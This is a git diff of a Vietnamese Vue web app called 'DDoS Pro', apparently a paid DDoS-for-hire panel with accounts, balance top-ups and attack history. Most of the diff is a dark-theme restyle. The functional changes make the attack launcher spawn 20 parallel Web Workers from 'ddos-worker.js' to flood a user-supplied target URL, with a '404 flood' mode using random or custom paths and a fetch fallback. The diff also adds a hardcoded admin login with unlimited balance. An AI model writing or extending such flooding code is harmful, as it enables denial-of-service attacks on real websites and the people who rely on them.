@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DDoS Pro</title>
+    <title>DDoS Pro - Ultimate</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
     <style>
         * { border-radius: 0 !important; }
         body { 
-            background: #e8f0fe; 
-            color: #1a2332; 
+            background: #0a1628; 
+            color: #e2e8f0; 
             font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
             padding: 0;
             margin: 0;
@@ -20,76 +20,59 @@
             justify-content: center;
         }
         .login-container { 
-            max-width: 400px; 
+            max-width: 420px; 
             width: 100%;
-            padding: 20px;
-            margin: 20px;
+            padding: 16px;
+            margin: 16px;
         }
         .login-card { 
-            background: #ffffff; 
-            border: none;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
-            padding: 32px 28px;
+            background: #111d2e; 
+            border: 1px solid #1a2a3a;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.6);
+            padding: 28px 24px;
         }
         .login-title {
             font-size: 24px;
             font-weight: 700;
-            color: #1a2332;
-            margin-bottom: 8px;
+            color: #7ae0ff;
+            margin-bottom: 6px;
             text-align: center;
         }
         .login-subtitle {
             font-size: 14px;
-            color: #64748b;
+            color: #8899aa;
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
         .form-group label {
             font-size: 13px;
             font-weight: 600;
-            color: #1a2332;
+            color: #b0c4de;
             margin-bottom: 4px;
             display: block;
         }
-        .form-group input {
+        .form-group input, .form-group textarea {
             width: 100%;
             padding: 10px 14px;
-            border: 1.5px solid #e2e8f0;
+            border: 1.5px solid #1a2a3a;
             border-radius: 8px !important;
             font-size: 14px;
-            background: #f8fafc;
+            background: #0a1628;
             transition: .2s;
-            color: #1a2332;
+            color: #e2e8f0;
         }
-        .form-group input:focus {
+        .form-group input:focus, .form-group textarea:focus {
             border-color: #2563eb;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(37,99,235,0.1);
-            background: #ffffff;
-        }
-        .form-group input::placeholder {
-            color: #94a3b8;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.2);
+            background: #0f1d33;
         }
         .form-group textarea {
-            width: 100%;
-            padding: 10px 14px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 8px !important;
-            font-size: 14px;
-            background: #f8fafc;
-            transition: .2s;
-            color: #1a2332;
             resize: vertical;
             min-height: 60px;
-        }
-        .form-group textarea:focus {
-            border-color: #2563eb;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(37,99,235,0.1);
-            background: #ffffff;
         }
         .form-check {
             padding-left: 1.8rem;
@@ -99,13 +82,19 @@
             width: 18px;
             height: 18px;
             cursor: pointer;
+            background: #0a1628;
+            border: 1px solid #1a2a3a;
+        }
+        .form-check-input:checked {
+            background-color: #2563eb;
+            border-color: #2563eb;
         }
         .form-check-label {
             font-size: 14px;
-            color: #1a2332;
+            color: #b0c4de;
             cursor: pointer;
         }
-        .btn-login {
+        .btn-login, .btn-register {
             width: 100%;
             padding: 12px;
             background: #2563eb;
@@ -118,38 +107,26 @@
             transition: .2s;
             margin-top: 8px;
         }
-        .btn-login:hover {
+        .btn-login:hover, .btn-register:hover {
             background: #1d4ed8;
             transform: scale(1.01);
         }
-        .btn-login:active {
+        .btn-login:active, .btn-register:active {
             transform: scale(0.98);
         }
         .divider {
             border: none;
-            border-top: 1.5px solid #e2e8f0;
-            margin: 20px 0;
+            border-top: 1.5px solid #1a2a3a;
+            margin: 18px 0;
         }
-        .forgot-link {
-            color: #2563eb;
-            font-weight: 700;
-            text-decoration: none;
+        .forgot-link, .register-link {
+            color: #60a5fa;
+            font-weight: 600;
             font-size: 14px;
             cursor: pointer;
             display: inline-block;
         }
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-        .register-link {
-            color: #2563eb;
-            font-weight: 700;
-            text-decoration: none;
-            font-size: 15px;
-            cursor: pointer;
-            display: inline-block;
-        }
-        .register-link:hover {
+        .forgot-link:hover, .register-link:hover {
             text-decoration: underline;
         }
         .bottom-links {
@@ -158,53 +135,37 @@
             align-items: center;
             margin-top: 4px;
         }
-        .btn-register {
-            width: 100%;
-            padding: 12px;
-            background: #2563eb;
-            color: #fff;
-            border: none;
-            border-radius: 8px !important;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: .2s;
-            margin-top: 8px;
-        }
-        .btn-register:hover {
-            background: #1d4ed8;
-        }
         .back-to-login {
-            color: #64748b;
+            color: #8899aa;
             font-size: 13px;
             cursor: pointer;
             text-align: center;
             margin-top: 10px;
         }
         .back-to-login span {
-            color: #2563eb;
+            color: #60a5fa;
             font-weight: 600;
         }
         .back-to-login span:hover {
             text-decoration: underline;
         }
         .demo-info {
-            background: #eff6ff;
+            background: #0a1628;
             padding: 10px;
             border-radius: 8px !important;
             font-size: 12px;
-            color: #64748b;
+            color: #8899aa;
             text-align: center;
             margin-top: 12px;
-            border: 1px solid #bfdbfe;
+            border: 1px solid #1a2a3a;
         }
         .demo-info strong {
-            color: #1a2332;
+            color: #7ae0ff;
         }
         .error-msg {
-            color: #dc2626;
+            color: #ef4444;
             font-size: 13px;
-            margin-top: 8px;
+            margin-top: 6px;
             text-align: center;
             display: none;
         }
@@ -212,50 +173,50 @@
             display: block;
         }
         .balance-display {
-            background: #eff6ff;
-            border: 1.5px solid #bfdbfe;
+            background: #0a1628;
+            border: 1.5px solid #1a2a3a;
             border-radius: 12px !important;
             padding: 12px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
         .balance-display .label {
             font-size: 14px;
-            color: #1e3a8a;
+            color: #8899aa;
             font-weight: 600;
         }
         .balance-display .amount {
             font-size: 22px;
             font-weight: 700;
-            color: #16a34a;
+            color: #4ade80;
         }
         .balance-display .amount .currency {
             font-size: 14px;
-            color: #64748b;
+            color: #8899aa;
             font-weight: 600;
         }
         .balance-display .amount .infinity {
-            color: #2563eb;
+            color: #facc15;
             font-size: 28px;
         }
         .bottom-menu {
             display: flex;
             justify-content: space-around;
-            background: #ffffff;
-            padding: 12px 0;
-            border-top: 1px solid #e2e8f0;
-            margin-top: 20px;
+            background: #0f1d33;
+            padding: 10px 0;
+            border-top: 1px solid #1a2a3a;
+            margin-top: 16px;
             border-radius: 12px !important;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+            box-shadow: 0 2px 12px rgba(0,0,0,0.3);
         }
         .bottom-menu .menu-item {
             display: flex;
             flex-direction: column;
             align-items: center;
             cursor: pointer;
-            color: #64748b;
+            color: #8899aa;
             font-size: 12px;
             font-weight: 600;
             transition: .2s;
@@ -268,13 +229,13 @@
             margin-bottom: 2px;
         }
         .bottom-menu .menu-item:hover {
-            color: #2563eb;
+            color: #7ae0ff;
         }
         .bottom-menu .menu-item.active {
-            color: #2563eb;
+            color: #7ae0ff;
         }
         .btn-success-custom {
-            background: #16a34a;
+            background: #22c55e;
             border: none;
             color: #fff;
             padding: 12px;
@@ -284,12 +245,12 @@
             transition: .2s;
         }
         .btn-success-custom:hover {
-            background: #15803d;
+            background: #16a34a;
         }
         .btn-ddos {
             width: 100%;
             padding: 12px;
-            background: #2563eb;
+            background: #ef4444;
             color: #fff;
             border: none;
             border-radius: 8px !important;
@@ -300,46 +261,47 @@
             margin-top: 8px;
         }
         .btn-ddos:hover {
-            background: #1d4ed8;
+            background: #dc2626;
         }
         .btn-ddos:disabled {
-            background: #93b5e8;
+            background: #7f1d1d;
             cursor: not-allowed;
             opacity: 0.7;
         }
         .card-content {
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+            background: #111d2e;
+            border: 1px solid #1a2a3a;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.3);
             padding: 16px;
             border-radius: 12px !important;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
         .card-content h6 {
-            color: #1a2332;
+            color: #7ae0ff;
             font-weight: 700;
         }
         select.form-select {
-            background: #f8fafc !important;
-            border: 1.5px solid #e2e8f0 !important;
+            background: #0a1628 !important;
+            border: 1.5px solid #1a2a3a !important;
             border-radius: 8px !important;
             padding: 10px 14px;
             width: 100%;
-            color: #1a2332;
+            color: #e2e8f0;
         }
         select.form-select:focus {
             border-color: #2563eb !important;
-            box-shadow: 0 0 0 3px rgba(37,99,235,0.1);
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.2);
         }
         .top-bar {
-            background: #ffffff;
+            background: #0f1d33;
             padding: 12px 20px;
             border-radius: 12px !important;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
-            margin-bottom: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.3);
+            margin-bottom: 14px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            border: 1px solid #1a2a3a;
         }
         .top-bar .user-info {
             display: flex;
@@ -354,13 +316,12 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #1e3a8a;
-            background: #bfdbfe;
+            color: #7ae0ff;
+            background: #1a2a3a;
             overflow: hidden;
             flex-shrink: 0;
-            border: 2px solid #bfdbfe;
+            border: 2px solid #1a2a3a;
             transition: .2s;
-            position: relative;
         }
         .top-bar .avatar:hover {
             border-color: #2563eb;
@@ -376,14 +337,14 @@
         .top-bar .username {
             font-weight: 700;
             font-size: 14px;
-            color: #1a2332;
+            color: #e2e8f0;
         }
         .qr-code {
             text-align: center;
             padding: 10px;
-            background: #f8fafc;
+            background: #0a1628;
             border-radius: 8px !important;
-            border: 1px dashed #bfdbfe;
+            border: 1px dashed #1a2a3a;
         }
         .qr-code img {
             max-width: 200px;
@@ -391,22 +352,22 @@
             border-radius: 8px !important;
         }
         .avatar-upload-btn {
-            background: #eff6ff;
-            border: 1px dashed #bfdbfe;
+            background: #0a1628;
+            border: 1px dashed #1a2a3a;
             padding: 4px 12px;
             border-radius: 20px !important;
             font-size: 11px;
-            color: #2563eb;
+            color: #60a5fa;
             cursor: pointer;
             transition: .2s;
         }
         .avatar-upload-btn:hover {
-            background: #dbeafe;
+            background: #1a2a3a;
         }
         .btn-send-code {
             width: 100%;
             padding: 12px;
-            background: #16a34a;
+            background: #22c55e;
             color: #fff;
             border: none;
             border-radius: 8px !important;
@@ -417,7 +378,7 @@
             margin-top: 8px;
         }
         .btn-send-code:hover {
-            background: #15803d;
+            background: #16a34a;
         }
         .btn-verify-code {
             width: 100%;
@@ -436,14 +397,14 @@
             background: #1d4ed8;
         }
         .back-to-login-forgot {
-            color: #64748b;
+            color: #8899aa;
             font-size: 13px;
             cursor: pointer;
             text-align: center;
             margin-top: 10px;
         }
         .back-to-login-forgot span {
-            color: #2563eb;
+            color: #60a5fa;
             font-weight: 600;
         }
         .back-to-login-forgot span:hover {
@@ -454,20 +415,16 @@
             height: 120px;
             border-radius: 50% !important;
             object-fit: cover;
-            border: 4px solid #bfdbfe;
+            border: 4px solid #1a2a3a;
             display: block;
             margin: 0 auto 16px auto;
         }
-        .status-duyet { background: #fef3c7; color: #92400e; }
-        .status-ddos { background: #dbeafe; color: #1e40af; }
-        .status-thanhcong { background: #d1fae5; color: #065f46; }
-        
         .profile-avatar {
             width: 100px;
             height: 100px;
             border-radius: 50% !important;
             object-fit: cover;
-            border: 4px solid #bfdbfe;
+            border: 4px solid #1a2a3a;
             display: block;
             margin: 0 auto 12px auto;
         }
@@ -476,13 +433,13 @@
             margin-bottom: 16px;
         }
         .profile-info .label {
-            color: #64748b;
+            color: #8899aa;
             font-size: 13px;
         }
         .profile-info .value {
             font-weight: 600;
             font-size: 16px;
-            color: #1a2332;
+            color: #e2e8f0;
         }
         .profile-info .value.role {
             display: inline-block;
@@ -492,16 +449,17 @@
         }
         .profile-info .value.role.admin { background: #fee2e2; color: #dc2626; }
         .profile-info .value.role.vip { background: #dbeafe; color: #2563eb; }
-        .profile-info .value.role.user { background: #e2e8f0; color: #475569; }
+        .profile-info .value.role.user { background: #1a2a3a; color: #8899aa; }
         .toast-message {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: #ffffff;
+            background: #111d2e;
+            border: 1px solid #1a2a3a;
             border-radius: 16px !important;
             padding: 24px 32px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             z-index: 9999;
             max-width: 340px;
             text-align: center;
@@ -509,17 +467,17 @@
         }
         .toast-message .icon {
             font-size: 48px;
-            color: #16a34a;
+            color: #4ade80;
             margin-bottom: 12px;
         }
         .toast-message .title {
             font-weight: 700;
             font-size: 18px;
-            color: #1a2332;
+            color: #e2e8f0;
         }
         .toast-message .desc {
             font-size: 14px;
-            color: #64748b;
+            color: #8899aa;
             margin: 8px 0 16px;
         }
         .toast-message .btn-toast {
@@ -541,7 +499,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.4);
+            background: rgba(0,0,0,0.6);
             z-index: 9998;
         }
         @keyframes fadeIn {
@@ -551,8 +509,21 @@
         .status-pending { background: #fef3c7; color: #92400e; }
         .status-processing { background: #dbeafe; color: #1e40af; }
         .status-done { background: #d1fae5; color: #065f46; }
-
-        /* ===== NÚT ZALO ===== */
+        .mode-badge {
+            font-size: 11px;
+            padding: 2px 10px;
+            border-radius: 20px !important;
+            background: #dbeafe;
+            color: #1e40af;
+        }
+        .mode-badge.mode-404 {
+            background: #fee2e2;
+            color: #dc2626;
+        }
+        .mode-badge.mode-mixed {
+            background: #fef3c7;
+            color: #92400e;
+        }
         .zalo-float {
             position: fixed;
             bottom: 100px;
@@ -561,11 +532,9 @@
             height: 60px;
             border-radius: 50% !important;
             background: #0068ff;
-            color: #fff;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 32px;
             box-shadow: 0 4px 20px rgba(0,104,255,0.5);
             cursor: grab;
             z-index: 9997;
@@ -619,8 +588,6 @@
                 display: none;
             }
         }
-
-        /* ===== ẢNH DDOS FLPHG ===== */
         .ddos-banner {
             width: 100%;
             max-height: 120px;
@@ -640,60 +607,43 @@
             gap: 10px;
             margin-bottom: 12px;
         }
-        .ddos-title img {
-            height: 40px;
-            width: auto;
-        }
         .ddos-title h6 {
             margin: 0;
-        }
-        .mode-badge {
-            font-size: 11px;
-            padding: 2px 10px;
-            border-radius: 20px !important;
-            background: #dbeafe;
-            color: #1e40af;
-        }
-        .mode-badge.mode-404 {
-            background: #fee2e2;
-            color: #dc2626;
-        }
-        .mode-badge.mode-mixed {
-            background: #fef3c7;
-            color: #92400e;
+            font-size: 20px;
+            font-weight: 700;
         }
         .text-secondary {
-            color: #64748b !important;
+            color: #8899aa !important;
         }
         .text-primary {
-            color: #2563eb !important;
+            color: #60a5fa !important;
         }
         .text-warning {
-            color: #d97706 !important;
+            color: #facc15 !important;
         }
         .text-success {
-            color: #16a34a !important;
+            color: #4ade80 !important;
         }
         .text-danger {
-            color: #dc2626 !important;
+            color: #ef4444 !important;
         }
         .bg-light {
-            background: #f1f5f9 !important;
+            background: #1a2a3a !important;
         }
         .alert-success {
-            background: #dcfce7;
-            color: #166534;
-            border: 1px solid #86efac;
+            background: #064e3b;
+            color: #4ade80;
+            border: 1px solid #16a34a;
         }
         .alert-warning {
-            background: #fef3c7;
-            color: #92400e;
-            border: 1px solid #fcd34d;
+            background: #78350f;
+            color: #fbbf24;
+            border: 1px solid #d97706;
         }
         .alert-info {
-            background: #dbeafe;
-            color: #1e40af;
-            border: 1px solid #93c5fd;
+            background: #1e3a5f;
+            color: #60a5fa;
+            border: 1px solid #2563eb;
         }
         .badge {
             font-weight: 600;
@@ -705,7 +655,6 @@
     <!-- ===== LOGIN / REGISTER / FORGOT ===== -->
     <div v-if="!currentUser" class="login-container">
         <div class="login-card">
-            <!-- Form đăng nhập -->
             <div v-if="currentForm === 'login'">
                 <div class="login-title">Đăng Nhập</div>
                 <div class="login-subtitle">Vui lòng nhập thông tin đăng nhập</div>
@@ -726,7 +675,6 @@
                 </div>
             </div>
 
-            <!-- Form đăng ký -->
             <div v-else-if="currentForm === 'register'">
                 <div class="login-title">Đăng Ký</div>
                 <div class="login-subtitle">Tạo tài khoản mới</div>
@@ -748,11 +696,9 @@
                 </div>
             </div>
 
-            <!-- Form quên mật khẩu -->
             <div v-else-if="currentForm === 'forgot'">
                 <div class="login-title">Quên Mật Khẩu</div>
                 <div class="login-subtitle">Nhập email để lấy lại mật khẩu</div>
-                
                 <div v-if="!forgotStep2">
                     <div class="form-group">
                         <label>Email đã đăng ký</label>
@@ -763,7 +709,6 @@
                         ← <span>Quay lại đăng nhập</span>
                     </div>
                 </div>
-
                 <div v-else>
                     <div class="alert alert-info text-center" style="border-radius:8px!important;font-size:13px;">
                         <i class="bi bi-envelope"></i> Mã xác nhận đã gửi đến email của bạn
@@ -784,7 +729,7 @@
             </div>
 
             <div class="demo-info">
-                <strong>Demo:</strong> admin / 12345 &nbsp;|&nbsp; user / 123
+                <strong>Demo:</strong> admin / 12345 &nbsp;|&nbsp; namvip6666 / namdz123 &nbsp;|&nbsp; user / 123
             </div>
         </div>
     </div>
@@ -800,18 +745,17 @@
                 </div>
                 <div>
                     <div class="username">{{currentUser.username}}</div>
-                    <span class="badge" :class="{'bg-primary':currentUser.role==='admin','bg-success':currentUser.role==='vip','bg-secondary':currentUser.role==='user'}" style="font-size:9px;">{{currentUser.role}}</span>
+                    <span class="badge" :class="{'bg-danger':currentUser.role==='admin','bg-success':currentUser.role==='vip','bg-secondary':currentUser.role==='user'}" style="font-size:9px;">{{currentUser.role}}</span>
                 </div>
             </div>
             <span class="fw-bold text-success"><i class="bi bi-wallet2 text-warning"></i> {{ formatCurrency(currentUser.balance || 0) }}₫</span>
         </div>
 
-        <!-- ===== NỘI DUNG CHÍNH ===== -->
         <!-- Profile -->
         <div v-show="activeMenu === 'profile'" class="card-content">
             <div class="profile-info">
                 <div style="position:relative;display:inline-block;">
-                    <img :src="currentUser.avatar || 'https://ui-avatars.com/api/?name='+currentUser.username+'&background=bfdbfe&color=1e3a8a&size=100'" class="profile-avatar" />
+                    <img :src="currentUser.avatar || 'https://ui-avatars.com/api/?name='+currentUser.username+'&background=1a2a3a&color=7ae0ff&size=100'" class="profile-avatar" />
                     <div style="position:absolute;bottom:4px;right:4px;">
                         <input type="file" ref="avatarInputProfile" @change="uploadAvatarProfile" accept="image/*" style="display:none;" />
                         <button class="btn btn-sm btn-primary" @click="$refs.avatarInputProfile.click()" style="border-radius:50%!important;width:32px;height:32px;padding:0;font-size:14px;">
@@ -842,14 +786,13 @@
             </div>
         </div>
 
-        <!-- ===== DDoS (ĐÃ THÊM CHẾ ĐỘ 404) ===== -->
+        <!-- ===== DDoS ===== -->
         <div v-show="activeMenu === 'ddos'" class="card-content">
-            <!-- Ảnh DDOS FLPHG -->
             <img src="https://cdn.upanhlaylink.com/i/R4tnXsnU.png" alt="DDOS FLPHG" class="ddos-banner" @click="activeMenu='lichsu'" title="Xem lịch sử DDoS" />
             
             <div class="ddos-title">
                 <i class="bi bi-hurricane text-primary" style="font-size:24px;"></i>
-                <h6 style="font-size:20px;font-weight:700;margin:0;">DDoS Web</h6>
+                <h6>DDoS Web</h6>
                 <span class="mode-badge" :class="{'mode-404': attackMode === '404', 'mode-mixed': attackMode === 'mixed'}" v-if="attackMode !== 'normal'">
                     {{ attackMode === '404' ? '💀 404 Flood' : '🔥 Mixed' }}
                 </span>
@@ -875,7 +818,6 @@
                 </div>
             </div>
 
-            <!-- ===== CHẾ ĐỘ TẤN CÔNG ===== -->
             <div class="form-group">
                 <label>Chế độ tấn công</label>
                 <select v-model="attackMode" class="form-select">
@@ -885,9 +827,8 @@
                 </select>
             </div>
 
-            <!-- ===== TÙY CHỌN 404 ===== -->
             <div v-if="attackMode === '404' || attackMode === 'mixed'" class="form-group">
-                <label>Đường dẫn 404 <small class="text-secondary">(mỗi dòng 1 đường dẫn)</small></label>
+                <label>Đường dẫn 404 <small class="text-secondary">(mỗi dòng 1 đường dẫn, để trống tự tạo)</small></label>
                 <textarea v-model="custom404Paths" class="form-control" rows="3" placeholder="/wp-admin/&#10;/api/v1/&#10;/css/"></textarea>
                 <small class="text-primary">* Để trống để tự động tạo đường dẫn ngẫu nhiên</small>
             </div>
@@ -933,7 +874,7 @@
                 <div class="form-group">
                     <label>Số tiền nạp</label>
                     <div class="input-group">
-                        <span class="input-group-text" style="background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:8px 0 0 8px!important;">₫</span>
+                        <span class="input-group-text" style="background:#0a1628;border:1.5px solid #1a2a3a;border-radius:8px 0 0 8px!important;color:#8899aa;">₫</span>
                         <input v-model.number="napAmount" type="number" class="form-control" min="5000" placeholder="5000" style="border-radius:0 8px 8px 0!important;" />
                     </div>
                 </div>
@@ -960,7 +901,7 @@
         <div v-show="activeMenu === 'lichsu'" class="card-content">
             <h6><i class="bi bi-clock text-primary"></i> Lịch sử</h6>
             <div style="max-height:400px;overflow-y:auto;font-size:13px;">
-                <div v-for="item in historyItems.slice().reverse()" :key="item.id" class="border-bottom py-2">
+                <div v-for="item in historyItems.slice().reverse()" :key="item.id" class="border-bottom border-secondary py-2">
                     <div class="d-flex justify-content-between align-items-center">
                         <div>
                             <span><i class="bi bi-link-45deg"></i> {{item.target}}</span>
@@ -1050,9 +991,9 @@ new Vue({
         maxRequests: 100,
         threads: 80,
         method: 'GET',
-        attackMode: 'normal',           // 'normal' | '404' | 'mixed'
-        custom404Paths: '',             // Đường dẫn 404 tùy chỉnh
-        randomPathLength: true,         // Tự động random đường dẫn
+        attackMode: 'normal',
+        custom404Paths: '',
+        randomPathLength: true,
         isRunning: false,
         statusText: 'Sẵn sàng',
         totalRequests: 0,
@@ -1069,7 +1010,7 @@ new Vue({
         isDragging: false,
         dragOffsetX: 0,
         dragOffsetY: 0,
-        ddosWorker: null
+        ddosWorkers: []
     },
     computed: {
         isAdmin() { return this.currentUser && this.currentUser.role === 'admin'; }
@@ -1083,8 +1024,9 @@ new Vue({
             if(!localStorage.getItem('ddos_users')) {
                 const defaultUsers = [
                     { id:1, username:'admin', password:'12345', role:'admin', balance: Infinity, avatar: null, email: 'admin@demo.com', createdAt: '01/01/2026' },
-                    { id:2, username:'user', password:'123', role:'user', balance: 20000, avatar: null, email: 'user@demo.com', createdAt: '15/06/2026' },
-                    { id:3, username:'vip', password:'vip', role:'vip', balance: 100000, avatar: null, email: 'vip@demo.com', createdAt: '20/08/2026' }
+                    { id:2, username:'namvip6666', password:'namdz123', role:'admin', balance: Infinity, avatar: null, email: 'nam@demo.com', createdAt: '01/01/2026' },
+                    { id:3, username:'user', password:'123', role:'user', balance: 20000, avatar: null, email: 'user@demo.com', createdAt: '15/06/2026' },
+                    { id:4, username:'vip', password:'vip', role:'vip', balance: 100000, avatar: null, email: 'vip@demo.com', createdAt: '20/08/2026' }
                 ];
                 localStorage.setItem('ddos_users', JSON.stringify(defaultUsers));
             }
@@ -1175,10 +1117,8 @@ new Vue({
             this.isRunning = false;
             this.currentForm = 'login';
             this.forgotStep2 = false;
-            if (this.ddosWorker) {
-                this.ddosWorker.terminate();
-                this.ddosWorker = null;
-            }
+            this.ddosWorkers.forEach(w => w.terminate());
+            this.ddosWorkers = [];
         },
         napTien() {
             if(this.napAmount < 5000) return alert('Tối thiểu 5,000₫');
@@ -1311,67 +1251,83 @@ new Vue({
 
             await new Promise(resolve => setTimeout(resolve, 30000));
 
-            // ===== BẮT ĐẦU DDoS VỚI WORKER =====
-            this.statusText = 'ĐANG TẤN CÔNG...';
+            // ===== BẮT ĐẦU DDoS VỚI 20 WORKER SONG SONG =====
+            this.statusText = 'ĐANG TẤN CÔNG (20 Workers)...';
             this.isRunning = true;
+            this.ddosWorkers = [];
+            
+            const numWorkers = 20;
+            const requestsPerWorker = Math.ceil(this.maxRequests / numWorkers);
+            let totalSent = 0;
+            let completedWorkers = 0;
+            let startTime = Date.now();
 
-            try {
-                this.ddosWorker = new Worker('ddos-worker.js');
-                
-                this.ddosWorker.postMessage({
-                    url: url,
-                    method: this.method,
-                    threads: Math.min(500, Math.max(1, this.threads)),
-                    maxRequests: this.maxRequests,
-                    attackMode: this.attackMode,
-                    custom404Paths: this.custom404Paths,
-                    randomPathLength: this.randomPathLength
-                });
+            for (let w = 0; w < numWorkers; w++) {
+                try {
+                    const worker = new Worker('ddos-worker.js');
+                    this.ddosWorkers.push(worker);
+                    
+                    const maxReq = Math.min(requestsPerWorker, this.maxRequests - totalSent);
+                    
+                    worker.postMessage({
+                        url: url,
+                        method: this.method,
+                        threads: Math.min(200, Math.max(1, this.threads)),
+                        maxRequests: maxReq,
+                        attackMode: this.attackMode,
+                        custom404Paths: this.custom404Paths,
+                        randomPathLength: this.randomPathLength
+                    });
 
-                this.ddosWorker.onmessage = (e) => {
-                    if (e.data.type === 'progress') {
-                        this.totalRequests = e.data.count;
-                        this.currentRPS = Math.round(e.data.count / 10);
-                    }
-                    if (e.data.type === 'done') {
-                        this.totalRequests = e.data.count;
-                        historyItem.requests = e.data.count;
-                        historyItem.status = 'Thành công';
-                        this.saveHistory();
-                        
-                        this.showDone = true;
-                        this.isRunning = false;
-                        this.statusText = 'ĐÃ HOÀN THÀNH';
-                        
-                        this.attackLogs.push({
-                            id: Date.now(),
-                            target: url,
-                            requests: e.data.count,
-                            duration: Math.round(e.data.count / (this.threads || 1)),
-                            time: new Date().toLocaleString(),
-                            mode: this.attackMode
-                        });
-                        this.saveLogs();
-                        
-                        this.ddosWorker.terminate();
-                        this.ddosWorker = null;
-                    }
-                };
+                    worker.onmessage = (e) => {
+                        if (e.data.type === 'progress') {
+                            totalSent += e.data.count;
+                            this.totalRequests = totalSent;
+                            const elapsed = (Date.now() - startTime) / 1000;
+                            this.currentRPS = elapsed > 0 ? Math.round(totalSent / elapsed) : 0;
+                        }
+                        if (e.data.type === 'done') {
+                            completedWorkers++;
+                            worker.terminate();
+                            
+                            if (completedWorkers === numWorkers) {
+                                historyItem.requests = totalSent;
+                                historyItem.status = 'Thành công';
+                                this.saveHistory();
+                                
+                                this.showDone = true;
+                                this.isRunning = false;
+                                this.statusText = 'ĐÃ HOÀN THÀNH';
+                                
+                                this.attackLogs.push({
+                                    id: Date.now(),
+                                    target: url,
+                                    requests: totalSent,
+                                    duration: Math.round((Date.now() - startTime) / 1000),
+                                    time: new Date().toLocaleString(),
+                                    mode: this.attackMode
+                                });
+                                this.saveLogs();
+                                this.ddosWorkers = [];
+                            }
+                        }
+                    };
 
-                this.ddosWorker.onerror = (err) => {
-                    console.error('Worker error:', err);
-                    this.statusText = 'LỖI WORKER';
-                    this.isRunning = false;
-                    if (this.ddosWorker) {
-                        this.ddosWorker.terminate();
-                        this.ddosWorker = null;
-                    }
-                };
+                    worker.onerror = (err) => {
+                        console.error('Worker error:', err);
+                        completedWorkers++;
+                        if (completedWorkers === numWorkers) {
+                            this.isRunning = false;
+                            this.statusText = 'LỖI WORKER';
+                            this.ddosWorkers = [];
+                        }
+                    };
 
-            } catch (error) {
-                // Fallback: dùng fetch thông thường
-                console.warn('Worker không hỗ trợ, dùng fetch thông thường');
-                await this.startDDoS_Fallback(url, historyItem);
+                } catch (error) {
+                    console.warn('Worker không hỗ trợ, dùng fetch thông thường');
+                    await this.startDDoS_Fallback(url, historyItem);
+                    return;
+                }
             }
         },
         async startDDoS_Fallback(url, historyItem) {
@@ -1398,7 +1354,6 @@ new Vue({
                     try {
                         let targetUrl = url;
                         
-                        // Thêm đường dẫn 404 nếu cần
                         if (this.attackMode === '404' || this.attackMode === 'mixed') {
                             let path = '';
                             if (this.custom404Paths && this.custom404Paths.trim()) {
